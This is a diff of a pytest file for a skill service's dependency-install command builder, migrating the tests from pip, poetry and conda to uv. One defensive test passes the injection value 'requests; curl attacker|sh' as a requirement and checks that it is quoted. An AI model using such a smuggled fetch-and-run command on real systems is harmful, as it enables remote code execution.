@@ -4,6 +4,7 @@ Focused on static helpers and validation logic without database dependencies.
 """
 
 import pytest
+from unittest.mock import AsyncMock, MagicMock
 
 from backend.services.skill import SkillService
 from backend.services.skill_errors import SkillError, SkillErrorCode
@@ -242,25 +243,26 @@ pandas>=1.3.0"""
         result = SkillService._normalize_dependency_spec(123)
         assert result is None
 
-    def test_build_python_commands_pip_with_requirements(self):
+    def test_build_python_commands_uv_requirements_file(self):
         cmds = SkillService._build_python_commands(
-            "pip", ["requests>=2.0.0"], ["requirements.txt", "setup.py"]
+            "uv", ["requests>=2.0.0"], ["requirements.txt", "setup.py"]
         )
-        assert "pip install -r requirements.txt" in cmds
-        assert "pip install 'requests>=2.0.0'" in cmds
+        assert cmds == ["uv pip install -r requirements.txt"]
 
-    def test_build_python_commands_pip_no_requirements_file(self):
-        cmds = SkillService._build_python_commands("pip", ["requests"], [])
-        assert "pip install requests" in cmds
-        assert "pip install -r requirements.txt" not in cmds
+    def test_build_python_commands_uv_inline_requirements(self):
+        cmds = SkillService._build_python_commands("uv", ["requests"], [])
+        assert cmds == ["uv pip install requests"]
 
     def test_build_python_commands_quotes_untrusted_requirements(self):
-        cmds = SkillService._build_python_commands("pip", ["requests; curl attacker|sh"], [])
-        assert "pip install 'requests; curl attacker|sh'" in cmds
+        cmds = SkillService._build_python_commands("uv", ["requests; curl attacker|sh"], [])
+        assert cmds == ["uv pip install 'requests; curl attacker|sh'"]
 
-    def test_build_python_commands_poetry(self):
-        cmds = SkillService._build_python_commands("poetry", [], [])
-        assert cmds == ["poetry install"]
+    def test_normalize_explicit_dependency_spec_rejects_non_uv_manager(self):
+        with pytest.raises(SkillError) as exc:
+            SkillService._normalize_explicit_dependency_spec(
+                {"python": {"manager": "poetry", "requirements": [], "files": []}}
+            )
+        assert exc.value.code == SkillErrorCode.INVALID_METADATA
 
     def test_build_python_commands_uv_with_requirements(self):
         cmds = SkillService._build_python_commands("uv", [], ["requirements.txt"])
@@ -274,20 +276,59 @@ pandas>=1.3.0"""
 
     def test_build_python_commands_uv_with_pyproject_and_requirements(self):
         cmds = SkillService._build_python_commands("uv", ["requests"], ["pyproject.toml", "requirements.txt"])
-        assert "uv sync" in cmds
-        assert "uv pip install requests" in cmds
+        assert cmds == ["uv sync"]
 
     def test_build_python_commands_uv_without_requirements(self):
         cmds = SkillService._build_python_commands("uv", [], [])
         assert cmds == []
 
-    def test_build_python_commands_conda_with_environment_yml(self):
-        cmds = SkillService._build_python_commands("conda", [], ["environment.yml"])
-        assert "conda env create -f environment.yml" in cmds
-
     def test_build_python_commands_empty(self):
-        cmds = SkillService._build_python_commands("pip", [], [])
+        cmds = SkillService._build_python_commands("uv", [], [])
         assert cmds == []
+
+    @pytest.mark.asyncio
+    async def test_get_install_instructions_uv_spec_returns_uv_commands(self, monkeypatch):
+        monkeypatch.setattr("backend.services.skill.is_skill_visible", lambda user, skill: True)
+        repo = AsyncMock()
+        version_repo = AsyncMock()
+        skill = MagicMock()
+        skill.is_active = True
+        skill.source_skill_id = None
+        repo.get_by_id.return_value = skill
+        version_record = MagicMock()
+        version_record.dependency_spec = {
+            "python": {
+                "manager": "uv",
+                "requirements": ["requests>=2.0.0"],
+                "files": ["requirements.txt"],
+            }
+        }
+        version_record.dependencies = ["requests>=2.0.0"]
+        version_repo.get_by_version.return_value = version_record
+        service = SkillService(repo, version_repo)
+
+        result = await service.get_install_instructions(MagicMock(), "skill-1", "1.0.0")
+
+        assert result["commands"] == ["uv pip install -r requirements.txt"]
+
+    @pytest.mark.asyncio
+    async def test_get_install_instructions_without_spec_returns_uv_pip_install(self, monkeypatch):
+        monkeypatch.setattr("backend.services.skill.is_skill_visible", lambda user, skill: True)
+        repo = AsyncMock()
+        version_repo = AsyncMock()
+        skill = MagicMock()
+        skill.is_active = True
+        skill.source_skill_id = None
+        repo.get_by_id.return_value = skill
+        version_record = MagicMock()
+        version_record.dependency_spec = {}
+        version_record.dependencies = ["requests>=2.0.0", "numpy"]
+        version_repo.get_by_version.return_value = version_record
+        service = SkillService(repo, version_repo)
+
+        result = await service.get_install_instructions(MagicMock(), "skill-1", "1.0.0")
+
+        assert result["commands"] == ["uv pip install 'requests>=2.0.0' numpy"]
 
     def test_build_node_commands_npm_with_lockfile(self):
         cmds = SkillService._build_node_commands("npm", True)
